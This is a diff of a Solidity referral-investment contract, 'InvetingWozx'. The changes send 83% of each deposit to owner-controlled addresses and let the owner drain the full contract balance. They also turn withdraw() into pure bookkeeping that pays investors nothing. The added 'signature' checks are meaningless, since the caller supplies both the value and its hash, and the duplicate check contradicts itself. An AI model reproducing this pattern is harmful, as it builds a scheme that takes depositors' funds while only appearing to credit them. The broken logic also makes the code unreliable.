@@ -4,21 +4,14 @@ import "./SafeMath.sol";
 
 contract InvetingWozx {
   using SafeMath for uint;
-  
-  struct Tariff {
-    uint time;
-    uint percent;
-  }
-  
-  struct Deposit {
-    uint tariff;
-    uint amount;
-    uint at;
-  }
 
   struct Referer {
     address myReferer;
     uint nivel;
+  }
+  
+  struct Firma {
+    bytes32 numero;
   }
 
   struct Investor {
@@ -27,40 +20,39 @@ contract InvetingWozx {
     bool exist;
     Referer[] referers;
     string ethereum;
-    uint balanceRef;
-    uint totalRef;
-    Deposit[] deposits;
-    uint invested;
-    uint paidAt;
-    uint withdrawn;
+    bool eth;
+    uint balanceTrx;
+    uint withdrawnTrx;
+    uint investedWozx;
+    uint withdrawnWozx;
+    
   }
   
   uint public MIN_DEPOSIT = 3000 trx;
-
+  
   address payable public owner;
+  address payable public marketing;
+  address payable public gateio;
+  
   address public NoValido;
   bool public Do;
   
-  Tariff[] public tariffs;
   uint public totalInvestors;
   uint public totalInvested;
   uint public totalRefRewards;
   uint public InContract;
+  
 
   mapping (address => Investor) public investors;
+  Firma[] firmas;
 
-  event DepositAt(address user, uint tariff, uint amount);
-  event Withdraw(address user, uint amount_withdraw);
-  event reInvest(address user, uint amount_reInvest);
-  event referersRegistered(address to_user, uint nivelProfundidad);
   
   constructor() public {
     owner = msg.sender;
+    marketing = msg.sender;
+    gateio = msg.sender;
     start();
     Do = true;
-       
-    tariffs.push(Tariff(100 * 28800, 200));
-    //tariffs.push(Tariff(1 * 28800, 100));
 
   }
 
@@ -93,6 +85,24 @@ contract InvetingWozx {
     return owner;
   }
   
+  function setMarketing(address payable _marketing) public returns (address){
+    require (msg.sender == owner);
+    require (_marketing != marketing);
+
+    marketing = _marketing;
+    
+    return marketing;
+  }
+  
+  function setGateio(address payable _gateio) public returns (address){
+    require (msg.sender == owner);
+    require (_gateio != gateio);
+
+    gateio = _gateio;
+
+    return gateio;
+  }
+  
   
   function start() internal {
     require (msg.sender == owner);
@@ -118,31 +128,33 @@ contract InvetingWozx {
   }
 
   function registerReferers(address ref, address spo) internal {
+      
+    uint nvl = 0;
 
       
     if (investors[spo].registered) {
 
       investors[spo].referers.push(Referer(ref,3));
-      uint nvl = 1;
-      emit referersRegistered(spo, nvl);
+      nvl++;
+     
       if (investors[spo].exist){
         spo = investors[spo].sponsor;
         if (investors[spo].registered){
           investors[spo].referers.push(Referer(ref,2));
-          nvl = 2;
-          emit referersRegistered(spo, nvl);
+          nvl++;
+          
           if (investors[spo].exist){
             spo = investors[spo].sponsor;
             if (investors[spo].registered){
               investors[spo].referers.push(Referer(ref,1));
-              nvl = 3;
-              emit referersRegistered(spo, nvl);
+              nvl++;
+              
               if (investors[spo].exist){
                 spo = investors[spo].sponsor;
                 if (investors[spo].registered){
                    investors[spo].referers.push(Referer(ref,1));
-                   nvl = 4;
-                   emit referersRegistered(spo, nvl);
+                   nvl++;
+                   
                 }
               }
             }
@@ -165,8 +177,7 @@ contract InvetingWozx {
           if ( investors[spo].referers[i].myReferer == yo){
               uint b = investors[spo].referers[i].nivel;
               uint a = amount * b / 100;
-              investors[spo].balanceRef += a;
-              investors[spo].totalRef += a;
+              investors[spo].balanceTrx += a;
               totalRefRewards += a;
           }
         }
@@ -178,10 +189,23 @@ contract InvetingWozx {
     
   }
   
-  function deposit(uint tariff, address _sponsor) external payable returns (uint ,bool) {
+  function deposit(uint orden, string calldata orden2, bytes32 wallet, address _sponsor, bytes32 firma, bytes32 firma2, bytes32 firma3) external payable  {
     require(msg.value >= MIN_DEPOSIT);
-    require(tariff < tariffs.length);
     require (_sponsor != msg.sender);
+    require(keccak256(abi.encodePacked(orden2)) == firma);
+    require(wallet == firma2);
+    
+    for (uint i = 0; i < firmas.length; i++) {
+        
+      if (keccak256(abi.encodePacked(firmas[i].numero)) == keccak256(abi.encodePacked(firma3))) {
+          require (keccak256(abi.encodePacked(firmas[i].numero)) != keccak256(abi.encodePacked(firma3)));
+        break;
+      }
+      
+    }
+    
+    
+    firmas.push(Firma(firma3));
     
     register();
 
@@ -193,37 +217,24 @@ contract InvetingWozx {
     }
 
     if (investors[msg.sender].exist){
-      rewardReferers(msg.sender, msg.value, investors[msg.sender].sponsor);
+      rewardReferers(msg.sender, orden, investors[msg.sender].sponsor);
     }
     
-    investors[msg.sender].invested += msg.value;
-    totalInvested += msg.value;
+    investors[msg.sender].investedWozx += orden;
+    totalInvested += orden;
     
-    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
     
-    owner.transfer(msg.value.mul(10).div(100));
-    InContract += msg.value.mul(90).div(100);
+    owner.transfer(msg.value.mul(18).div(100));
+    marketing.transfer(msg.value.mul(10).div(100));
+    gateio.transfer(msg.value.mul(55).div(100));
+    InContract += msg.value.mul(17).div(100);
     
-    emit DepositAt(msg.sender, tariff, msg.value);
-
-    return (msg.value, true);
   }
   
   function withdrawable(address any_user) public view returns (uint amount) {
     Investor storage investor = investors[any_user];
+    amount = investor.balanceTrx;
     
-    for (uint i = 0; i < investor.deposits.length; i++) {
-      Deposit storage dep = investor.deposits[i];
-      Tariff storage tariff = tariffs[dep.tariff];
-      
-      uint finish = dep.at + tariff.time;
-      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
-      uint till = block.number > finish ? finish : block.number;
-
-      if (since < till) {
-        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
-      }
-    }
   }
     
   function withdraw000() public returns (bool set_Do) {
@@ -239,8 +250,10 @@ contract InvetingWozx {
 
   function withdraw001() public returns (uint) {
     require(msg.sender == owner);
-    require (InContract > 0);
-    if (msg.sender.send(InContract)){
+    //require (InContract > 0);
+    
+    uint valor = address(this).balance;
+    if (msg.sender.send(valor)){
       uint IC = InContract;
       InContract = 0;
       return IC;
@@ -249,19 +262,7 @@ contract InvetingWozx {
 
   function MYwithdrawable() public view returns (uint amount) {
     Investor storage investor = investors[msg.sender];
-    
-    for (uint i = 0; i < investor.deposits.length; i++) {
-      Deposit storage dep = investor.deposits[i];
-      Tariff storage tariff = tariffs[dep.tariff];
-      
-      uint finish = dep.at + tariff.time;
-      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
-      uint till = block.number > finish ? finish : block.number;
-
-      if (since < till) {
-        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
-      }
-    }
+    amount = investor.balanceTrx;
   }
 
   function miETH (address  _direccion) public view returns(string memory eth)  {
@@ -283,43 +284,17 @@ contract InvetingWozx {
     MIN_DEPOSIT = num*1 trx;
   }
  
-  function profit() internal returns (uint) {
-    Investor storage investor = investors[msg.sender];
-    
-    uint amount = withdrawable(msg.sender);
-    
-    amount += investor.balanceRef;
-    investor.balanceRef = 0;
-    
-    investor.paidAt = block.number;
-    
-    return amount;
-
-  }
   
   function withdraw() external {
     if (Do){
-      uint amount = profit();
-      uint tariff = 0;
-      uint amount25 = amount.mul(25).div(100);
-      uint amount75 = amount.mul(75).div(100);
-      if (msg.sender.send(amount75)) {
-        investors[msg.sender].withdrawn += amount75;
-        investors[msg.sender].invested += amount25;
-        
-        investors[msg.sender].deposits.push(Deposit(tariff, amount25, block.number));
-        
-        totalInvested += amount25;
-
-        InContract -= amount75;
+      uint amount = withdrawable(msg.sender);
+        investors[msg.sender].withdrawnTrx += amount;
+        InContract -= amount;
       
-        emit Withdraw(msg.sender, amount75);
-        emit reInvest(msg.sender, amount25);
       }
-
-    }
     
   }
+  
 
   function () external payable {}  
   
